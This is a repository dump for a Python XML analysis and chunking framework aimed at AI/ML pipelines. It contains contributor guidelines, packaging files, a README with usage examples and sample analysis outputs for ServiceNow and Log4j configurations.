   source venv/bin/activate  # On Windows: venv\Scripts\activate
   ```

3. **Install development dependencies:**
   ```bash
   pip install -e ".[dev]"
   ```

4. **Run tests to verify setup:**
   ```bash
   python -m pytest tests/
   ```

### Project Structure

```
xml-analysis-framework/
├── src/                          # Main source code
│   ├── handlers/                 # Specialized XML handlers
│   ├── core/                     # Core analysis and chunking logic
│   └── utils/                    # Utility functions
├── tests/                        # Test suite
│   ├── unit/                     # Unit tests for individual handlers
│   ├── integration/              # Integration tests
│   └── comprehensive/            # End-to-end tests
├── examples/                     # Usage examples and demos
├── sample_data/                  # Test XML files
└── docs/                         # Documentation
```

## 🛠️ Development Guidelines

### Code Style

- **Python Style**: Follow PEP 8 with these specifics:
  - Line length: 100 characters maximum
  - Use type hints for all public functions
  - Docstrings: Google style format

- **Formatting**: Use Black for code formatting:
  ```bash
  black src/ tests/ examples/
  ```

- **Linting**: Use flake8 for linting:
  ```bash
  flake8 src/ tests/ examples/
  ```

### Testing Requirements

All contributions must include appropriate tests:

- **Unit Tests**: Test individual handler methods
- **Integration Tests**: Test handler with real XML files
- **Regression Tests**: Ensure existing functionality isn't broken

**Running Tests:**
```bash
# Run all tests
python -m pytest tests/

# Run specific test categories
python -m pytest tests/unit/
python -m pytest tests/integration/

# Run with coverage
python -m pytest tests/ --cov=src --cov-report=html
```

## 📝 Contributing Types

### 1. Adding New XML Handlers

We welcome handlers for new XML formats! Here's how to add one:

#### Handler Requirements
- Must extend the base `XMLHandler` interface
- Implement all required methods: `can_handle()`, `detect_type()`, `analyze()`, `extract_key_data()`
- Include comprehensive docstrings
- Handle edge cases gracefully
- Provide meaningful AI use case suggestions

#### Handler Template
```python
#!/usr/bin/env python3
"""
[Format Name] Handler

Handles [XML format description] documents.
Common file patterns: *.xml, *.specific_extension
"""

import xml.etree.ElementTree as ET
from typing import Dict, List, Optional, Any, Tuple
from ..base import DocumentTypeInfo, SpecializedAnalysis, XMLHandler

class YourFormatHandler(XMLHandler):
    """Handler for [Format Name] XML documents"""
    
    def can_handle(self, root: ET.Element, namespaces: Dict[str, str]) -> Tuple[bool, float]:
        """Check if this handler can process the XML document"""
        # Implementation here
        pass
    
    def detect_type(self, root: ET.Element, namespaces: Dict[str, str]) -> DocumentTypeInfo:
        """Detect and classify the document type"""
        # Implementation here
        pass
    
    def analyze(self, root: ET.Element, file_path: str) -> SpecializedAnalysis:
        """Perform specialized analysis"""
        # Implementation here
        pass
    
    def extract_key_data(self, root: ET.Element) -> Dict[str, Any]:
        """Extract key structured data"""
        # Implementation here
        pass
```

#### Steps to Add a Handler

1. **Create the handler file**: `src/handlers/your_format_handler.py`
2. **Write comprehensive tests**: `tests/unit/test_your_format_handler.py`
3. **Add test XML files**: `sample_data/test_files/[size]/your_format_example.xml`
4. **Register the handler**: Add import in `src/handlers/__init__.py`
5. **Update documentation**: Add handler to README and architecture docs

### 2. Improving Chunking Strategies

The framework supports multiple chunking strategies for different use cases:

- **Hierarchical**: Preserves XML structure and relationships
- **Content-Aware**: Focuses on semantic content boundaries
- **Sliding Window**: Fixed-size chunks with overlap
- **Auto**: Automatically selects best strategy

**Contributing Chunking Improvements:**
- Enhance existing strategies in `src/core/chunking.py`
- Add new chunking algorithms
- Improve chunk quality metrics
- Optimize chunk size distribution

### 3. Test Coverage Improvements

Help us maintain our 100% success rate:

- Add test cases for edge cases
- Contribute XML files from real-world scenarios
- Create synthetic test data for complex scenarios
- Improve test automation and CI/CD

### 4. Documentation Enhancements

- API documentation improvements
- Usage examples and tutorials
- Architecture diagrams and explanations
- Best practices guides

## 📋 Submission Process

### Pull Request Guidelines

1. **Fork and Branch**:
   ```bash
   git checkout -b feature/your-feature-name
   ```

2. **Make Changes**:
   - Follow coding standards
   - Add comprehensive tests
   - Update documentation as needed

3. **Test Your Changes**:
   ```bash
   # Run full test suite
   python -m pytest tests/
   
   # Run linting
   flake8 src/ tests/
   black --check src/ tests/
   
   # Test with real XML files
   python examples/framework_demo.py
   ```

4. **Commit with Clear Messages**:
   ```bash
   git commit -m "Add ServiceNow incident XML handler
   
   - Implements specialized handler for ServiceNow incident exports
   - Includes field extraction and relationship mapping
   - Adds comprehensive test coverage with sample files
   - Generates AI use cases for incident analysis"
   ```

5. **Create Pull Request**:
   - Use descriptive title and detailed description
   - Reference any related issues
   - Include test results and examples

### Pull Request Template

```markdown
## Description
Brief description of changes and motivation.

## Type of Change
- [ ] New XML handler
- [ ] Bug fix
- [ ] Performance improvement
- [ ] Documentation update
- [ ] Test coverage improvement

## Testing
- [ ] Unit tests pass
- [ ] Integration tests pass
- [ ] Manual testing completed
- [ ] New test files added (if applicable)

## Sample XML Files
List any new test files added or existing files that benefit from this change.

## AI Use Cases
Describe potential AI/ML applications enabled by this contribution.

## Checklist
- [ ] Code follows project style guidelines
- [ ] Self-review completed
- [ ] Documentation updated
- [ ] Tests added/updated
- [ ] Changes don't break existing functionality
```

## 🐛 Bug Reports

### Before Reporting
1. Check existing issues for duplicates
2. Test with the latest version
3. Try to reproduce with minimal example

### Bug Report Template
```markdown
**Describe the Bug**
Clear description of the problem.

**XML File Details**
- File type/format: 
- File size:
- Sample content (sanitized):

**Expected Behavior**
What should happen.

**Actual Behavior**
What actually happens.

**Error Messages**
Full error traceback if applicable.

**Environment**
- Python version:
- Operating system:
- Framework version:

**Reproduction Steps**
1. Step one
2. Step two
3. ...
```

## 💡 Feature Requests

We welcome suggestions for new features! Please include:

- **Use Case**: Why is this feature needed?
- **Proposed Solution**: How should it work?
- **XML Formats**: What formats would benefit?
- **AI Applications**: How would this enable AI/ML use cases?

## 🎖️ Recognition

Contributors are recognized in several ways:

- **README Credits**: Listed in the contributors section
- **Release Notes**: Contributions highlighted in release announcements
- **Handler Attribution**: Handler files include author information
- **Community Recognition**: Outstanding contributions featured in project updates

## 📞 Getting Help

- **GitHub Issues**: For bugs and feature requests
- **GitHub Discussions**: For questions and community interaction
- **Documentation**: Check the `docs/` directory for detailed guides

## 📄 Code of Conduct

This project follows a professional and inclusive environment:

- Be respectful and constructive in all interactions
- Focus on the technical aspects of contributions
- Help create a welcoming space for contributors of all backgrounds
- Follow GitHub's Community Guidelines

## 🎯 Contribution Priorities

Current high-priority areas for contributions:

1. **Enterprise XML Handlers**: ERP, CRM, and business system formats
2. **Healthcare Standards**: HL7, CCDA, FHIR XML formats  
3. **Government/Compliance**: SCAP, XBRL, regulatory formats
4. **Performance Optimization**: Large file handling and memory efficiency
5. **AI Integration**: Enhanced semantic analysis and chunking strategies

---

Thank you for contributing to the XML Analysis Framework! Your contributions help make XML analysis more accessible and powerful for the AI/ML community.
</file>

<file path="src/__init__.py">
"""
XML Analysis Framework

An XML document analysis and preprocessing framework designed for AI/ML data pipelines.
Features specialized handlers for different document types and generates structured,
AI-ready data and optimized chunks.
"""

__version__ = "1.2.0"
__author__ = "AI Building Blocks"
</file>

<file path="pyproject.toml">
[build-system]
requires = ["setuptools>=45", "wheel", "setuptools_scm[toml]>=6.2"]
build-backend = "setuptools.build_meta"

[project]
name = "xml-analysis-framework"
dynamic = ["version"]
description = "XML document analysis and preprocessing framework designed for AI/ML data pipelines"
readme = "README.md"
license = {text = "MIT"}
authors = [
    {name = "AI Building Blocks", email = "wjackson@redhat.com"}
]
keywords = ["xml", "analysis", "ai", "ml", "document-processing", "semantic-search"]
classifiers = [
    "Development Status :: 5 - Production/Stable",
    "Intended Audience :: Developers",
    "Topic :: Software Development :: Libraries :: Python Modules",
    "Topic :: Text Processing :: Markup :: XML",
    "License :: OSI Approved :: MIT License",
    "Programming Language :: Python :: 3",
    "Programming Language :: Python :: 3.7",
    "Programming Language :: Python :: 3.8",
    "Programming Language :: Python :: 3.9",
    "Programming Language :: Python :: 3.10",
    "Programming Language :: Python :: 3.11",
    "Programming Language :: Python :: 3.12",
]
requires-python = ">=3.7"

[project.urls]
Homepage = "https://github.com/redhat-ai-americas/xml-analysis-framework"
Repository = "https://github.com/redhat-ai-americas/xml-analysis-framework"
Issues = "https://github.com/redhat-ai-americas/xml-analysis-framework/issues"
Documentation = "https://github.com/redhat-ai-americas/xml-analysis-framework/blob/main/README.md"

[project.optional-dependencies]
dev = [
    "pytest>=6.0",
    "black>=21.0",
    "flake8>=3.8",
    "mypy>=0.800",
]
docs = [
    "sphinx>=3.0",
    "sphinx_rtd_theme>=0.5",
]

[project.scripts]
xml-analyze = "xml_analysis_framework.examples.basic_analysis:main"
xml-analyze-enhanced = "xml_analysis_framework.examples.enhanced_analysis:main"

[tool.setuptools]
package-dir = {"" = "src"}

[tool.setuptools.packages.find]
where = ["src"]

[tool.setuptools_scm]
write_to = "src/xml_analysis_framework/_version.py"
</file>

<file path="README.md">
# XML Analysis Framework

[![Python 3.7+](https://img.shields.io/badge/python-3.7+-blue.svg)](https://www.python.org/downloads/)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![Test Success Rate](https://img.shields.io/badge/Tests-100%25%20Success-brightgreen.svg)](./test_results)
[![Handlers](https://img.shields.io/badge/Specialized%20Handlers-29-blue.svg)](./src/handlers)
[![AI Ready](https://img.shields.io/badge/AI%20Ready-✓-green.svg)](./AI_INTEGRATION_ARCHITECTURE.md)

A production-ready XML document analysis and preprocessing framework with **29 specialized handlers** designed for AI/ML data pipelines. Transform any XML document into structured, AI-ready data and optimized chunks with **100% success rate** across 71 diverse test files.

## 🚀 Quick Start

### Document Analysis
```python
from core.analyzer import XMLDocumentAnalyzer

analyzer = XMLDocumentAnalyzer()
analysis = analyzer.analyze_document("path/to/file.xml")

# Analysis result structure:
{
    "file_path": "path/to/file.xml",
    "document_type": DocumentTypeInfo(type_name="Apache Ant Build", confidence=0.95, ...),
    "handler_used": "AntBuildHandler", 
    "confidence": 0.95,
    "analysis": SpecializedAnalysis(...),
    "namespaces": {...},
    "file_size": 1234
}
```

### Smart Chunking
```python
from core.analyzer import XMLDocumentAnalyzer
from core.chunking import ChunkingOrchestrator

# First get analysis
analyzer = XMLDocumentAnalyzer()
analysis = analyzer.analyze_document("path/to/file.xml")

# Convert analysis format for chunking
chunking_analysis = {
    'document_type': {
        'type_name': analysis['document_type'].type_name,
        'confidence': analysis['document_type'].confidence
    },
    'analysis': analysis['analysis']
}

orchestrator = ChunkingOrchestrator()
# Automatic strategy selection with analysis context
chunks = orchestrator.chunk_document(
    file_path="path/to/file.xml",
    specialized_analysis=chunking_analysis,
    strategy='auto'  # or 'hierarchical', 'sliding_window', 'content_aware'
)
```

### Complete Workflow
```python
from core.analyzer import XMLDocumentAnalyzer
from core.chunking import ChunkingOrchestrator, XMLChunkingStrategy

# 1. Analyze document
analyzer = XMLDocumentAnalyzer()
analysis = analyzer.analyze_document("file.xml")

# 2. Generate optimal chunks (convert analysis format for chunking)
chunking_analysis = {
    'document_type': {
        'type_name': analysis['document_type'].type_name,
        'confidence': analysis['document_type'].confidence
    },
    'analysis': analysis['analysis']
}
orchestrator = ChunkingOrchestrator()
chunks = orchestrator.chunk_document("file.xml", chunking_analysis, strategy='auto')

# 3. Process results (use base strategy for token estimation)
token_estimator = XMLChunkingStrategy()
for chunk in chunks:
    token_count = token_estimator.estimate_tokens(chunk.content)
    print(f"Chunk {chunk.chunk_id}: ~{token_count} tokens")
    print(f"Content: {chunk.content[:100]}...")
```

## 🎯 Key Features

### 1. **🏆 Production Proven Results**
- **100% Success Rate**: All 71 test files processed successfully
- **2,752 Chunks Generated**: Average 38.8 optimized chunks per file  
- **54 Document Types Detected**: Comprehensive XML format coverage
- **Zero Dependencies**: Pure Python stdlib implementation

### 2. **🧠 29 Specialized XML Handlers**
Enterprise-grade document intelligence:
- **Security & Compliance**: SCAP, SAML, SOAP (90-100% confidence)
- **DevOps & Build**: Maven POM, Ant, Ivy, Spring, Log4j (95-100% confidence)
- **Content & Documentation**: RSS/Atom, DocBook, XHTML, SVG
- **Enterprise Systems**: ServiceNow, Hibernate, Struts configurations
- **Data & APIs**: GPX, KML, GraphML, WADL/WSDL, XML Schemas

### 3. **⚡ Intelligent Processing Pipeline**
- **Smart Document Detection**: Confidence scoring with graceful fallbacks
- **Semantic Chunking**: Document-type-aware optimal segmentation
- **Token Optimization**: LLM context window optimized chunks
- **Quality Assessment**: Automated data quality metrics

### 4. **🤖 AI-Ready Integration**
- **Vector Store Ready**: Structured embeddings with rich metadata
- **Graph Database Compatible**: Relationship and dependency mapping
- **LLM Agent Optimized**: Context-aware, actionable insights
- **Complete AI Workflows**: See [AI Integration Guide](./AI_INTEGRATION_ARCHITECTURE.md)

## 📋 Supported Document Types (29 Handlers)

| Category | Handlers | Confidence | Use Cases |
|----------|----------|------------|-----------|
| **🔐 Security & Compliance** | SCAP, SAML, SOAP | 90-100% | Vulnerability assessment, compliance monitoring, security posture analysis |
| **⚙️ DevOps & Build Tools** | Maven POM, Ant, Ivy | 95-100% | Dependency analysis, build optimization, technical debt assessment |
| **🏢 Enterprise Configuration** | Spring, Hibernate, Struts, Log4j | 95-100% | Configuration validation, security scanning, modernization planning |
| **📄 Content & Documentation** | RSS, DocBook, XHTML, SVG | 90-100% | Content intelligence, documentation search, knowledge management |
| **🗂️ Enterprise Systems** | ServiceNow, XML Sitemap | 95-100% | Incident analysis, process automation, system integration |
| **🌍 Geospatial & Data** | GPX, KML, GraphML | 85-95% | Route optimization, geographic analysis, network intelligence |
| **🔌 API & Integration** | WADL, WSDL, XLIFF | 90-95% | Service discovery, integration planning, translation workflows |
| **📐 Schemas & Standards** | XML Schema (XSD) | 100% | Schema validation, data modeling, API documentation |

## 🏗️ Architecture

```
xml-analysis-framework/
├── README.md                    # Project overview
├── LICENSE                      # MIT license
├── requirements.txt            # Dependencies (Python stdlib only)
├── setup.py                    # Package installation
├── .gitignore                  # Git ignore patterns
├── .github/workflows/          # CI/CD pipelines
│
├── src/                        # Source code
│   ├── core/                   # Core framework
│   │   ├── analyzer.py         # Main analysis engine
│   │   ├── schema_analyzer.py  # XML schema analysis
│   │   └── chunking.py         # Chunking strategies
│   ├── handlers/              # 28 specialized handlers
│   └── utils/                 # Utility functions
│
├── tests/                      # Comprehensive test suite
│   ├── unit/                  # Handler unit tests (16 files)
│   ├── integration/           # Integration tests (11 files)
│   ├── comprehensive/         # Full system tests (4 files)
│   └── run_all_tests.py      # Master test runner
│
├── examples/                   # Usage examples
│   ├── basic_analysis.py      # Simple analysis
│   ├── enhanced_analysis.py   # Full featured analysis
│   └── framework_demo.py      # Complete demonstration
│
├── scripts/                    # Utility scripts
│   ├── collect_test_files.py  # Test data collection
│   └── debug/                 # Debug utilities
│
├── docs/                       # Documentation
│   ├── architecture/          # Design documents
│   ├── guides/                # User guides
│   └── api/                   # API documentation
│
├── sample_data/               # Test XML files (99+ examples)
│   ├── test_files/           # Real-world examples
│   └── test_files_synthetic/ # Generated test cases
│
└── artifacts/                 # Build artifacts, results
    ├── analysis_results/     # JSON analysis outputs
    └── reports/             # Generated reports
```

## 🔧 Installation

```bash
# Install from source
git clone https://github.com/redhat-ai-americas/xml-analysis-framework.git
cd xml-analysis-framework
pip install -e .

# Or install development dependencies
pip install -e .[dev]
```

**No external dependencies required!** Uses only Python standard library (3.7+).

## 📖 Usage Examples

### Basic Analysis
```python
from core.schema_analyzer import XMLSchemaAnalyzer

analyzer = XMLSchemaAnalyzer()
schema = analyzer.analyze_file('document.xml')

# Access schema properties
print(f"Root element: {schema.root_element}")
print(f"Total elements: {schema.total_elements}")
print(f"Namespaces: {schema.namespaces}")
```

### Enhanced Analysis with Specialized Handlers
```python
from core.analyzer import XMLDocumentAnalyzer

analyzer = XMLDocumentAnalyzer()
result = analyzer.analyze_document('maven-project.xml')

print(f"Document Type: {result['document_type'].type_name}")
print(f"Confidence: {result['confidence']:.2f}")
print(f"Handler Used: {result['handler_used']}")
print(f"AI Use Cases: {result['analysis'].ai_use_cases}")
```

### Intelligent Chunking
```python
from core.chunking import ChunkingOrchestrator, XMLChunkingStrategy

orchestrator = ChunkingOrchestrator()
chunks = orchestrator.chunk_document(
    'large_document.xml',
    specialized_analysis={},  # Analysis result from XMLDocumentAnalyzer
    strategy='auto'
)

# Token estimation
token_estimator = XMLChunkingStrategy()
for chunk in chunks:
    token_count = token_estimator.estimate_tokens(chunk.content)
    print(f"Chunk {chunk.chunk_id}: ~{token_count} tokens")
```

## 🧪 Testing & Validation

### **Production-Tested Performance**
- ✅ **100% Success Rate**: All 71 XML files processed successfully  
- ✅ **2,752 Chunks Generated**: Optimal segmentation across diverse document types
- ✅ **54 Document Types**: Comprehensive coverage from ServiceNow to SCAP to Maven
- ✅ **Zero Dependencies**: Pure Python stdlib implementation

### **Test Coverage**
```bash
# Run comprehensive end-to-end test
python test_end_to_end_workflow.py

# Run individual component tests  
python test_all_chunking.py        # Chunking strategies
python test_servicenow_analysis.py # ServiceNow handler validation
python test_scap_analysis.py       # Security document analysis
```

### **Real-World Test Data**
- **Enterprise Systems**: ServiceNow incident exports (8 files)
- **Security Documents**: SCAP/XCCDF compliance reports (4 files)  
- **Build Configurations**: Maven, Ant, Ivy projects (12 files)
- **Enterprise Config**: Spring, Hibernate, Log4j (15 files)
- **Content & APIs**: DocBook, RSS, WADL, Sitemaps (32 files)

## 🤖 AI Integration & Use Cases

### **AI Workflow Overview**

```mermaid
graph LR
    A[XML Documents] --> B[XML Analysis Framework]
    B --> C[Document Analysis<br/>29 Specialized Handlers]
    B --> D[Smart Chunking<br/>Token-Optimized]
    B --> E[AI-Ready Output<br/>Structured JSON]
    
    E --> F[Vector Store<br/>Semantic Search]
    E --> G[Graph Database<br/>Relationships]
    E --> H[LLM Agent<br/>Intelligence]
    
    F --> I[Security Intelligence]
    G --> J[DevOps Automation] 
    H --> K[Knowledge Management]
    
    style B fill:#e1f5fe,stroke:#01579b,stroke-width:2px
    style E fill:#f3e5f5,stroke:#4a148c,stroke-width:2px
    style I fill:#e8f5e8,stroke:#1b5e20,stroke-width:2px
    style J fill:#e8f5e8,stroke:#1b5e20,stroke-width:2px
    style K fill:#e8f5e8,stroke:#1b5e20,stroke-width:2px
```

> **See [Complete AI Integration Guide](./AI_INTEGRATION_ARCHITECTURE.md)** for detailed workflows, implementation examples, and advanced use cases.

### **🔐 Security Intelligence Applications**
- **SCAP Compliance Monitoring**: Automated vulnerability assessment and risk scoring
- **SAML Security Analysis**: Authentication flow security validation and threat detection  
- **Log4j Vulnerability Detection**: CVE scanning and automated remediation guidance
- **SOAP Security Assessment**: Web service configuration security review

### **⚙️ DevOps & Configuration Intelligence**
- **Dependency Risk Analysis**: Maven/Ant/Ivy vulnerability scanning and upgrade planning
- **Configuration Drift Detection**: Spring/Hibernate consistency monitoring
- **Build Optimization**: Performance analysis and security hardening recommendations
- **Technical Debt Assessment**: Legacy system modernization planning

### **🏢 Enterprise System Intelligence**  
- **ServiceNow Process Mining**: Incident pattern analysis and workflow optimization
- **Cross-System Correlation**: Configuration impact analysis and change management
- **Compliance Automation**: Regulatory requirement mapping and validation

### **📚 Knowledge Management Applications**
- **Technical Documentation Search**: Semantic search across DocBook, API documentation
- **Content Intelligence**: RSS/Atom trend analysis and topic extraction
- **API Discovery**: WADL/WSDL service catalog and integration recommendations

## 🔬 Production Metrics & Performance

### **Framework Statistics**
- **✅ 100% Success Rate**: 71/71 files processed without errors
- **📊 2,752 Chunks Generated**: Optimal 38.8 avg chunks per document
- **🎯 54 Document Types**: Comprehensive XML format coverage
- **⚡ High Performance**: 0.015s average processing time per document
- **🏗️ Zero Dependencies**: Pure Python standard library implementation

### **Handler Confidence Levels**
- **100% Confidence**: XML Schema (XSD), Maven POM, Log4j, RSS/Atom, Sitemaps
- **95% Confidence**: ServiceNow, Apache Ant, Ivy, Spring, Hibernate, SAML, SOAP
- **90% Confidence**: SCAP/XCCDF, DocBook, WADL/WSDL
- **Intelligent Fallback**: Generic XML handler for unknown formats

## 🚀 Extending the Framework

### Adding New Handlers
```python
from core.analyzer import XMLHandler, SpecializedAnalysis, DocumentTypeInfo

class CustomHandler(XMLHandler):
    def can_handle(self, root, namespaces):
        return root.tag == 'custom-format', 1.0
    
    def detect_type(self, root, namespaces):
        return DocumentTypeInfo(
            type_name="Custom Format",
            confidence=1.0,
            version="1.0"
        )
    
    def analyze(self, root, file_path):
        return SpecializedAnalysis(
            document_type="Custom Format",
            key_findings={"custom_data": "value"},
            ai_use_cases=["Custom AI application"],
            structured_data={"extracted": "data"}
        )
```

### Custom Chunking Strategies
```python
from core.chunking import XMLChunkingStrategy, ChunkingOrchestrator

class CustomChunking(XMLChunkingStrategy):
    def chunk_document(self, file_path, specialized_analysis=None):
        # Custom chunking logic
        return chunks

# Register custom strategy
orchestrator = ChunkingOrchestrator()
orchestrator.strategies['custom'] = CustomChunking
```

## 📊 Real Production Output Examples

### **ServiceNow Incident Analysis**
```json
{
  "document_summary": {
    "document_type": "ServiceNow Incident",
    "type_confidence": 0.95,
    "handler_used": "ServiceNowHandler",
    "file_size_mb": 0.029
  },
  "key_insights": {
    "data_highlights": {
      "state": "7", "priority": "4", "impact": "3",
      "assignment_group": "REDACTED_GROUP",
      "resolution_time": "240 days, 0:45:51",
      "journal_analysis": {
        "total_entries": 9,
        "unique_contributors": 1
      }
    },
    "ai_applications": [
      "Incident pattern analysis",
      "Resolution time prediction", 
      "Workload optimization"
    ]
  },
  "structured_content": {
    "chunking_strategy": "content_aware_medium",
    "total_chunks": 75,
    "quality_metrics": {
      "overall_readiness": 0.87
    }
  }
}
```

### **Log4j Security Analysis** 
```json
{
  "document_summary": {
    "document_type": "Log4j Configuration",
    "type_confidence": 1.0,
    "handler_used": "Log4jConfigHandler"
  },
  "key_insights": {
    "data_highlights": {
      "security_concerns": {
        "security_risks": ["External socket appender detected"],
        "log4shell_vulnerable": false,
        "external_connections": [{"host": "log-server.example.com"}]
      },
      "performance": {
        "async_appenders": 1,
        "performance_risks": ["Location info impacts performance"]
      }
    },
    "ai_applications": [
      "Vulnerability assessment",
      "Performance optimization",
      "Security hardening"
    ]
  },
  "structured_content": {
    "total_chunks": 19,
    "chunking_strategy": "hierarchical_small"
  }
}
```

## 🤝 Contributing

We welcome contributions! Whether you're adding new XML handlers, improving chunking algorithms, or enhancing AI integrations, your contributions help make XML analysis more accessible and powerful.

**Priority contribution areas:**
- 🎯 New XML format handlers (ERP, CRM, healthcare, government)
- ⚡ Enhanced chunking algorithms and strategies
- 🚀 Performance optimizations for large files
- 🤖 Advanced AI/ML integration examples
- 📝 Documentation and usage examples

**👉 See [CONTRIBUTING.md](CONTRIBUTING.md) for complete guidelines, development setup, and submission process.**

## 📄 License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

## 🙏 Acknowledgments

- Designed as part of the **AI Building Blocks** initiative
- Built for the modern AI/ML ecosystem
- Community-driven XML format support
</file>

<file path="setup.py">
#!/usr/bin/env python3
"""
Setup script for XML Analysis Framework
"""

from setuptools import setup, find_packages
import os

# Read the contents of README file
this_directory = os.path.abspath(os.path.dirname(__file__))
with open(os.path.join(this_directory, 'README.md'), encoding='utf-8') as f:
    long_description = f.read()

setup(
    name="xml-analysis-framework",
    version="1.2.0",
    author="AI Building Blocks",
    author_email="wjackson@redhat.com",
    description="XML document analysis and preprocessing framework designed for AI/ML data pipelines",
    long_description=long_description,
    long_description_content_type="text/markdown",
    url="https://github.com/redhat-ai-americas/xml-analysis-framework",
    project_urls={
        "Bug Reports": "https://github.com/redhat-ai-americas/xml-analysis-framework/issues",
        "Source": "https://github.com/redhat-ai-americas/xml-analysis-framework",
        "Documentation": "https://github.com/redhat-ai-americas/xml-analysis-framework/blob/main/README.md",
    },
    packages=find_packages(where="src"),
    package_dir={"": "src"},
    classifiers=[
        "Development Status :: 5 - Production/Stable",
        "Intended Audience :: Developers",
        "Topic :: Software Development :: Libraries :: Python Modules",
        "Topic :: Text Processing :: Markup :: XML",
        "License :: OSI Approved :: MIT License",
        "Programming Language :: Python :: 3",
        "Programming Language :: Python :: 3.7",
        "Programming Language :: Python :: 3.8",
        "Programming Language :: Python :: 3.9",
        "Programming Language :: Python :: 3.10",
        "Programming Language :: Python :: 3.11",
    ],
    python_requires=">=3.7",
    install_requires=[
        # Only using Python standard library - no external dependencies
    ],
    extras_require={
        "dev": [
            "pytest>=6.0",
            "black>=21.0",
            "flake8>=3.8",
            "mypy>=0.800",
        ],
        "docs": [
            "sphinx>=3.0",
            "sphinx_rtd_theme>=0.5",
        ],
    },
    entry_points={
        "console_scripts": [
            "xml-analyze=src.examples.basic_analysis:main",
            "xml-analyze-enhanced=src.examples.enhanced_analysis:main",
        ],
    },
    include_package_data=True,
    zip_safe=False,
)
</file>

</files>
